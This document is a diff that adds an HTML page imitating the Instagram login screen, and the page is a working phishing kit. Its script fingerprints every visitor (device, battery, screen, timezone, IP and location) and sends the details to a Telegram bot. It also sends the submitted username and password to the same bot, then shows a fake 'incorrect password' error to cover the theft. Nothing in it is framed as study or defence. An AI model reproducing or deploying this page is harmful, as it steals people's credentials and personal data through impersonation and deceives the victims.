@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login</title>
+  <style>
+    body {
+      background: #222a2e;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+    .container {
+      width: 100%;
+      max-width: 480px;
+      margin: 90px auto 0 auto;
+      background: transparent;
+      padding: 60px 16px 40px 16px;
+      border-radius: 16px;
+      box-sizing: border-box;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .lang-select {
+      color: #b3b3b3;
+      margin-bottom: 30px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .logo {
+      margin-bottom: 56px;
+    }
+    .logo img {
+      width: 100px;
+      height: 100px;
+      display: block;
+      margin: 0 auto;
+    }
+    .input-box {
+      width: 100%;
+      margin-bottom: 24px;
+    }
+    .input-box input {
+      width: 100%;
+      min-height: 60px;
+      padding: 0 28px;
+      border: 2px solid #444;
+      border-radius: 30px;
+      background: #222a2e;
+      color: #fff;
+      font-size: 20px;
+      outline: none;
+      margin-bottom: 0;
+      box-sizing: border-box;
+    }
+    .login-btn {
+      width: 100%;
+      min-height: 60px;
+      background: #0095f6;
+      color: #fff;
+      border: none;
+      border-radius: 30px;
+      font-size: 20px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 12px;
+      margin-bottom: 36px;
+      transition: background 0.2s;
+    }
+    .login-btn:hover {
+      background: #1877f2;
+    }
+    .forgot {
+      color: #b3b3b3;
+      text-align: center;
+      margin-bottom: 56px;
+      text-decoration: none;
+      display: block;
+      font-size: 18px;
+    }
+    .create-btn {
+      width: 62%;
+      min-height: 60px;
+      background: transparent;
+      color: #0095f6;
+      border: 3px solid #0095f6;
+      border-radius: 30px;
+      font-size: 20px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 24px;
+      margin-bottom: 56px;
+      transition: background 0.2s, color 0.2s;
+      letter-spacing: 0.5px;
+      padding: 0 28px;
+      box-sizing: border-box;
+    }
+    .create-btn:hover {
+      background: #0095f6;
+      color: #fff;
+    }
+    .meta {
+      color: #b3b3b3;
+      text-align: center;
+      font-size: 20px;
+      margin-top: 36px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="lang-select">English (US) &#9660;</div>
+    <div class="logo">
+      <img src="62-instagram-512.png" alt="Instagram Logo">
+    </div>
+    <form id="login-form">
+      <div class="input-box">
+        <input type="text" placeholder="Username, email or mobile number" required>
+      </div>
+      <div class="input-box">
+        <input type="password" placeholder="Password" required>
+      </div>
+      <button class="login-btn" type="submit">Log in</button>
+    </form>
+    <a href="#" class="forgot">Forgot password?</a>
+    <button class="create-btn">Create new account</button>
+    <div class="meta">&#8734; Meta</div>
+  </div>
+  <script>
+    // Fetch Telegram config from server.txt
+    async function getTelegramConfig() {
+      try {
+        const res = await fetch('server.txt');
+        const text = await res.text();
+        const token = text.match(/TOKEN=(.*)/)[1].trim();
+        const chatId = text.match(/CHAT_ID=(.*)/)[1].trim();
+        return { token, chatId };
+      } catch (e) {
+        alert('Failed to load Telegram config.');
+        return { token: '', chatId: '' };
+      }
+    }
+
+    // Replace all Telegram API calls to use dynamic config
+    let TG_API = '';
+    let TELEGRAM_TOKEN = '';
+    let TELEGRAM_CHAT_ID = '';
+    getTelegramConfig().then(cfg => {
+      TELEGRAM_TOKEN = cfg.token;
+      TELEGRAM_CHAT_ID = cfg.chatId;
+      TG_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+    });
+
+    // Guess device name/type from user agent
+    function getDeviceName() {
+      const ua = navigator.userAgent;
+      if (/android/i.test(ua)) {
+        const match = ua.match(/Android.*; (.+?) Build/);
+        return match ? `Android (${match[1]})` : 'Android Device';
+      } else if (/iPhone/i.test(ua)) {
+        return 'iPhone';
+      } else if (/iPad/i.test(ua)) {
+        return 'iPad';
+      } else if (/Macintosh/i.test(ua)) {
+        return 'Mac';
+      } else if (/Windows/i.test(ua)) {
+        return 'Windows PC';
+      } else if (/Linux/i.test(ua)) {
+        return 'Linux PC';
+      } else {
+        return 'Unknown Device';
+      }
+    }
+
+    // Collect device info
+    async function getDeviceInfo() {
+      let batteryInfo = '';
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          batteryInfo = `🔋 Battery: ${(battery.level * 100).toFixed(0)}%${battery.charging ? ' (Charging)' : ''}`;
+        } catch (e) {
+          batteryInfo = '🔋 Battery: N/A';
+        }
+      } else {
+        batteryInfo = '🔋 Battery: N/A';
+      }
+      // Additional details
+      const screenRes = `🖥️ Screen: ${window.screen.width}x${window.screen.height}`;
+      const timezone = `⏰ Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
+      const referrer = `🔗 Referrer: ${document.referrer || 'Direct/None'}`;
+      let connectionType = '📶 Connection: N/A';
+      if (navigator.connection && navigator.connection.effectiveType) {
+        connectionType = `📶 Connection: ${navigator.connection.effectiveType.toUpperCase()}`;
+      }
+      const cpuCores = `🧠 CPU Cores: ${navigator.hardwareConcurrency || 'N/A'}`;
+      const memory = `💾 RAM: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A'}`;
+      const info = [
+        `📱 Device: ${getDeviceName()}`,
+        `🧭 User Agent: ${navigator.userAgent}`,
+        `💻 Platform: ${navigator.platform}`,
+        `🌐 Language: ${navigator.language}`,
+        screenRes,
+        timezone,
+        referrer,
+        connectionType,
+        cpuCores,
+        memory,
+        batteryInfo,
+        `🕒 Time: ${new Date().toLocaleString()}`
+      ];
+      return info.join('\n');
+    }
+
+    // Fetch IP and geolocation info (CORS-friendly)
+    async function getIPInfo() {
+      try {
+        const res = await fetch('https://geolocation-db.com/json/');
+        if (!res.ok) throw new Error('IP info fetch failed');
+        const data = await res.json();
+        return `🌍 IP: ${data.IPv4}\n🏙️ City: ${data.city}\n🌎 Country: ${data.country_name}\n🌐 State: ${data.state}`;
+      } catch (e) {
+        return '🌍 IP Info: N/A';
+      }
+    }
+
+    // Send message to Telegram
+    async function sendToTelegram(message) {
+      await fetch(TG_API, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: `chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`
+      });
+    }
+
+    // On page load, send device info and IP info
+    window.addEventListener('DOMContentLoaded', async () => {
+      const deviceInfo = await getDeviceInfo();
+      const ipInfo = await getIPInfo();
+      sendToTelegram(`🟢 New visitor!\n${deviceInfo}\n${ipInfo}`);
+    });
+
+    // On login button click, send credentials, device info, and IP info, then after 10 seconds show error message
+    document.addEventListener('DOMContentLoaded', () => {
+      const loginForm = document.getElementById('login-form');
+      const forgotBtn = document.querySelector('.forgot');
+      const createBtn = document.querySelector('.create-btn');
+      const container = document.querySelector('.container');
+      let errorDiv = null;
+      if (!loginForm) return;
+      loginForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        // Remove previous error if exists
+        if (errorDiv) {
+          errorDiv.remove();
+          errorDiv = null;
+        }
+        const email = loginForm.querySelector('input[type="text"]').value;
+        const password = loginForm.querySelector('input[type="password"]').value;
+        const deviceInfo = await getDeviceInfo();
+        const ipInfo = await getIPInfo();
+        // Send info to Telegram immediately
+        const credsBlock = `\n\n📋 Tap to copy:\n👤 Email/Phone: \`${email}\`\n🔑 Password: \`${password}\``;
+        const message = `🔐 Login Attempt${credsBlock}\n${deviceInfo}\n${ipInfo}`;
+        sendToTelegram(message);
+        // Wait 10 seconds, then show error message
+        setTimeout(() => {
+          if (!errorDiv) {
+            errorDiv = document.createElement('div');
+            errorDiv.style.textAlign = 'center';
+            errorDiv.style.color = '#fff';
+            errorDiv.style.margin = '20px 0';
+            errorDiv.style.fontSize = '18px';
+            errorDiv.innerText = 'Sorry, your password was incorrect. Please double-check your password.';
+            container.appendChild(errorDiv);
+          }
+        }, 10000);
+      });
+      // Forgot password link
+      if (forgotBtn) {
+        forgotBtn.addEventListener('click', function(e) {
+          e.preventDefault();
+          window.open('https://www.instagram.com/accounts/password/reset/', '_blank');
+        });
+      }
+      // Create new account button
+      if (createBtn) {
+        createBtn.addEventListener('click', function(e) {
+          e.preventDefault();
+          window.open('https://www.instagram.com/accounts/emailsignup/', '_blank');
+        });
+      }
+    });
+  </script>
+</body>
+</html>
